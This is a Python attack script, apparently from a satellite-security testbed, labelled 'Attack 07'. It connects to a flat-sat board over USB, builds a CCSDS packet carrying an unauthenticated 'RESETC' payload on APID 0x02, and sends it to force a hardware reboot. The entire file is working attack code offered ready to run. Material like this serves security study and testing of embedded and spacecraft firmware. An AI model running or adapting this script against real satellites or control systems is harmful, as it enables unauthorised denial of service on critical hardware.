#!/usr/bin/env python3
"""
Attack 07: Unauthenticated RESETC Reboot (USB Variant)
Sends unauthenticated RESETC reboot command (APID 0x02) to trigger hardware reboot on flat-sat-fw-interno.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from flatsat_usb import FlatSatUSB
from pwnsat_packets import build_ccsds_packet

def main():
    print("[+] Attack 07: Unauthenticated RESETC Hardware Reboot (flat-sat-fw-interno USB Variant)")
    usb = FlatSatUSB()
    if not usb.connect():
        print("[X] Failed to connect to FlatSat USB port.")
        sys.exit(1)

    print("[*] Transmitting unauthenticated RESETC command (APID 0x02)...")
    resetc_payload = b"\x52\x45\x53\x45\x54\x43"
    packet = build_ccsds_packet(apid=0x02, payload=resetc_payload)
    usb.send_raw(packet)
    print("[✓] RESETC hardware reboot command sent over USB. Hardware rebooting (Red LED).")
    usb.close()

if __name__ == "__main__":
    main()
